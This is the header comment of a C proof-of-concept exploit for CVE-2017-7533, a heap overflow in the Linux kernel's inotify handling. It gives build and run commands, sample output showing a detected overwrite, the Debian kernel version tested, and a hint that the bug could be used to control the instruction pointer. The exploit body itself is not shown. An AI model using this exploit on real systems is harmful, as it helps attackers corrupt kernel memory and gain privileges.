/*
 * 
 *
 * CVE-2017-7533 inotfiy linux kernel vulnerability.
 *
 * $ gcc -o exploit exploit.c -lpthread
 * $./exploit
 *
 * ```
 * Listening for events.
 * Listening for events.
 * alloc_len : 50
 * longname="test_dir/bbbb32103210321032100��1����"
 * handle_events() event->name : b, event->len : 16
 * Detected overwrite!!!
 * callrename done.
 * alloc_len : 50
 * ```
 * This is a heap overflow bug, 
 * tested on the Debian 8 Linux version 3.16.39(amd64) successfully.
 *
 * You could modifiy one byte to manipulate rip register, but I do not tried hard to get root.
 *
 * Thanks to the Vladis Dronov <vdronov () redhat com> and someone from HK university.
 * ```
 * ```
 * Jeremy Huang (jeremyhcw@gmail.com)
 */
=======
//Trigger inotify event by file open and rename to trigger the vulnerability and exploit